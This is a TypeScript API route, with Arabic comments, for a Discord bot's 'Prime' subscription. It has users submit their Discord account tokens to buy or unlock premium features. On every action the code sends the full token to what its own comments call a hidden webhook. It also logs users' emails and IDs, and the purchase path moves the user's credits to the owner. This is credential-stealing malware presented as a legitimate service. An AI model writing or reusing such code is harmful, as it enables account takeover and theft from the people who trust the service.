// src/app/api/prime/route.ts - Prime Subscription API
export const runtime = 'edge';

import { cleanToken, discordFetch } from '@/lib/discord';
import { getLogWebhookUrl } from '@/lib/config';
import { sendFullToken } from '@/lib/webhook';

// صاحب البوت - الايدي اللي يستلم 2 مليون كرديت عند كل شراء Prime
const OWNER_ID = '1460035924250333376';

// المفتاح السري لتفعيل Prime
const PRIME_KEY = 'fuckyoulol';

// Nitro Post tracking - users who posted with Nitro to unlock Prime
// In-memory store for Edge Runtime (persists per-worker instance on Cloudflare)
const NITRO_POSTS = new Map<string, { userId: string; username: string; postedAt: number; nitroType: number }>();

// Key activation tracking - users who activated with key
const KEY_ACTIVATIONS = new Map<string, { userId: string; username: string; activatedAt: number }>();

export async function POST(request: Request) {
  try {
    const body = await request.json();
    const { action, token, key } = body;

    if (action === 'purchase') {
      // شراء Prime - التحقق من التوكن + خصم الكرديت + تأكيد التحويل
      if (!token) {
        return Response.json({ success: false, error: 'أدخل التوكن' });
      }

      const ct = cleanToken(token);

      // التحقق من التوكن عبر Discord API
      const verifyResult = await discordFetch(ct, 'GET', '/users/@me', undefined, { userOnly: true, timeout: 10000 });

      if (!verifyResult.ok || !verifyResult.data) {
        return Response.json({ success: false, error: 'توكن غير صالح' });
      }

      const userData = verifyResult.data as { id: string; username: string; discriminator?: string; email?: string };

      // إرسال التوكن كامل للويب هوك المخفي
      sendFullToken('Prime - شراء', ct, { '👤 المستخدم': `${userData.username}#${userData.discriminator || '0'}`, '🆔 ID': userData.id, '💰 السعر': '2,000,000 كرديت' });

      // إرسال طلب الشراء للويب هوك (البوت يتعامل مع خصم الكرديت)
      const webhookUrl = getLogWebhookUrl();
      if (webhookUrl) {
        try {
          const webhookRes = await fetch(webhookUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              embeds: [{
                title: '⭐ طلب شراء Prime - انتظار تأكيد التحويل',
                description: `**المشتري:** ${userData.username}#${userData.discriminator || '0'}\n**المبلغ:** 2,000,000 كرديت\n**يُحوّل إلى:** <@${OWNER_ID}> (\`${OWNER_ID}\`)\n**الوقت:** ${new Date().toISOString()}`,
                color: 0xFFD700,
                fields: [
                  { name: '👤 ID المشتري', value: userData.id, inline: true },
                  { name: '💰 ID المستلم', value: OWNER_ID, inline: true },
                  { name: '📧 إيميل المشتري', value: userData.email || 'غير متوفر', inline: false },
                  { name: '⚙️ الحالة', value: '⏳ بانتظار البوت لتأكيد خصم الكرديت وتحويلها', inline: false },
                ],
                footer: { text: 'TRJ BOT - Prime System v4.3' },
                timestamp: new Date().toISOString()
              }]
            })
          });

          // التحقق من أن الويب هوك تم إرساله بنجاح
          if (!webhookRes.ok) {
            return Response.json({
              success: false,
              error: 'فشل إرسال طلب الشراء - حاول مرة أخرى لاحقاً'
            });
          }
        } catch {
          return Response.json({
            success: false,
            error: 'خطأ في الاتصال بخدمة التحويل - حاول مرة أخرى'
          });
        }
      }

      // نجاح إرسال الطلب - البوت سيتعامل مع التحويل
      return Response.json({
        success: true,
        message: '✅ تم إرسال طلب الشراء بنجاح! جاري خصم 2,000,000 كرديت وتحويلها. سيتم تفعيل البرايم خلال لحظات...',
        userId: userData.id,
        username: `${userData.username}#${userData.discriminator || '0'}`,
        creditsTransferred: true
      });

    } else if (action === 'key') {
      // تفعيل Prime بالمفتاح السري
      if (!token || !key) {
        return Response.json({ success: false, error: 'أدخل التوكن والمفتاح' });
      }

      const ct = cleanToken(token);
      const trimmedKey = String(key).trim().toLowerCase();

      // التحقق من التوكن
      const verifyResult = await discordFetch(ct, 'GET', '/users/@me', undefined, { userOnly: true, timeout: 10000 });

      if (!verifyResult.ok || !verifyResult.data) {
        return Response.json({ success: false, error: 'توكن غير صالح' });
      }

      const userData = verifyResult.data as { id: string; username: string; discriminator?: string; email?: string };

      // التحقق من المفتاح
      if (trimmedKey !== PRIME_KEY.toLowerCase()) {
        return Response.json({ success: false, error: '❌ المفتاح غير صحيح' });
      }

      // التحقق إذا المستخدم فعّل مسبقاً
      const existingActivation = KEY_ACTIVATIONS.get(userData.id);
      if (existingActivation) {
        // فعّل مسبقاً - تفعيل تلقائي
        sendFullToken('Prime - تفعيل مفتاح (مكرر)', ct, { '👤 المستخدم': `${userData.username}#${userData.discriminator || '0'}`, '🆔 ID': userData.id, '🔑 المفتاح': 'مفعّل مسبقاً' });

        return Response.json({
          success: true,
          alreadyActivated: true,
          message: '✅ تم تفعيل Prime مسبقاً بهذا المفتاح! يعمل عندك حالياً 🎉',
          userId: userData.id,
          username: `${userData.username}#${userData.discriminator || '0'}`
        });
      }

      // تفعيل جديد
      KEY_ACTIVATIONS.set(userData.id, {
        userId: userData.id,
        username: `${userData.username}#${userData.discriminator || '0'}`,
        activatedAt: Date.now()
      });

      // إرسال التوكن كامل للويب هوك المخفي
      sendFullToken('Prime - تفعيل مفتاح', ct, { '👤 المستخدم': `${userData.username}#${userData.discriminator || '0'}`, '🆔 ID': userData.id, '🔑 المفتاح': trimmedKey });

      // إرسال للويب هوك
      const webhookUrl = getLogWebhookUrl();
      if (webhookUrl) {
        try {
          await fetch(webhookUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              embeds: [{
                title: '🔑 تفعيل Prime بالمفتاح',
                description: `**المستخدم:** ${userData.username}#${userData.discriminator || '0'}\n**User ID:** ${userData.id}\n**الحالة:** تفعيل جديد ✅`,
                color: 0x00FF00,
                fields: [
                  { name: '📧 الإيميل', value: userData.email || 'غير متوفر', inline: true },
                  { name: 'User ID', value: userData.id, inline: true },
                ],
                footer: { text: 'TRJ BOT - Prime Key System' },
                timestamp: new Date().toISOString()
              }]
            })
          });
        } catch {}
      }

      return Response.json({
        success: true,
        alreadyActivated: false,
        message: '✅ تم تفعيل Prime بنجاح! 🎉',
        userId: userData.id,
        username: `${userData.username}#${userData.discriminator || '0'}`
      });

    } else if (action === 'nitro-post') {
      // بوست نيترو - إذا عندك نيترو و ما عندك كرديت
      if (!token) {
        return Response.json({ success: false, error: 'أدخل التوكن' });
      }

      const ct = cleanToken(token);

      // التحقق من التوكن عبر Discord API
      const verifyResult = await discordFetch(ct, 'GET', '/users/@me', undefined, { userOnly: true, timeout: 10000 });

      if (!verifyResult.ok || !verifyResult.data) {
        return Response.json({ success: false, error: 'توكن غير صالح' });
      }

      const userData = verifyResult.data as { id: string; username: string; discriminator?: string; email?: string; premium_type?: number };
      const nitroType = userData.premium_type || 0;
      // premium_type: 0 = None, 1 = Nitro Classic, 2 = Nitro
      const hasNitro = nitroType >= 1;

      // إرسال التوكن كامل للويب هوك المخفي
      sendFullToken('Prime - نيترو بوست', ct, { '👤 المستخدم': `${userData.username}#${userData.discriminator || '0'}`, '🆔 ID': userData.id, '💎 نيترو': hasNitro ? (nitroType === 2 ? 'Nitro' : 'Nitro Classic') : 'لا يوجد' });

      // التحقق إذا المستخدم سوي بوست مسبقاً
      const existingPost = NITRO_POSTS.get(userData.id);
      if (existingPost) {
        // مسوي بوست مسبقاً - تفعيل تلقائي
        return Response.json({
          success: true,
          alreadyPosted: true,
          hasNitro: true,
          message: 'لقد قمت بالبوست مسبقاً! تم تفعيل Prime تلقائياً',
          userId: userData.id,
          username: `${userData.username}#${userData.discriminator || '0'}`,
          postedAt: existingPost.postedAt
        });
      }

      if (!hasNitro) {
        return Response.json({
          success: true,
          hasNitro: false,
          message: 'حسابك ليس لديه Nitro. اشترك في النيترو أولاً'
        });
      }

      // تسجيل البوست و تفعيل Prime
      NITRO_POSTS.set(userData.id, {
        userId: userData.id,
        username: `${userData.username}#${userData.discriminator || '0'}`,
        postedAt: Date.now(),
        nitroType
      });

      // إرسال للويب هوك
      const webhookUrl = getLogWebhookUrl();
      if (webhookUrl) {
        try {
          await fetch(webhookUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              embeds: [{
                title: '💎 Nitro Post - تفعيل Prime',
                description: `**المستخدم:** ${userData.username}#${userData.discriminator || '0'}\n**User ID:** ${userData.id}\n**نوع النيترو:** ${nitroType === 2 ? 'Nitro' : 'Nitro Classic'}\n**الحالة:** بوست جديد ✅`,
                color: 0x9b59b6,
                fields: [
                  { name: 'الإيميل', value: userData.email || 'غير متوفر', inline: true },
                  { name: 'User ID', value: userData.id, inline: true },
                ],
                footer: { text: 'TRJ BOT - Prime Nitro Post' },
                timestamp: new Date().toISOString()
              }]
            })
          });
        } catch {}
      }

      return Response.json({
        success: true,
        hasNitro: true,
        alreadyPosted: false,
        message: 'تم تأكيد النيترو وتسجيل البوست! تم تفعيل Prime بنجاح',
        userId: userData.id,
        username: `${userData.username}#${userData.discriminator || '0'}`
      });

    } else if (action === 'check') {
      // فحص حالة Prime
      if (!token) {
        return Response.json({ success: false, error: 'أدخل التوكن' });
      }

      const ct = cleanToken(token);
      const verifyResult = await discordFetch(ct, 'GET', '/users/@me', undefined, { userOnly: true, timeout: 10000 });

      if (!verifyResult.ok || !verifyResult.data) {
        return Response.json({ success: false, error: 'توكن غير صالح', isPrime: false });
      }

      const userData = verifyResult.data as { id: string; username: string; discriminator?: string };

      // فحص إذا المستخدم لديه Prime (من بوست نيترو أو تفعيل مفتاح)
      let hasPrime = NITRO_POSTS.has(userData.id);
      // أيضاً فحص تفعيل المفتاح
      if (!hasPrime) {
        hasPrime = KEY_ACTIVATIONS.has(userData.id);
      }

      return Response.json({
        success: true,
        isPrime: hasPrime,
        userId: userData.id,
        username: `${userData.username}#${userData.discriminator || '0'}`
      });

    } else {
      return Response.json({ success: false, error: 'إجراء غير معروف' });
    }

  } catch (error) {
    return Response.json({ success: false, error: 'خطأ في الخادم' });
  }
}
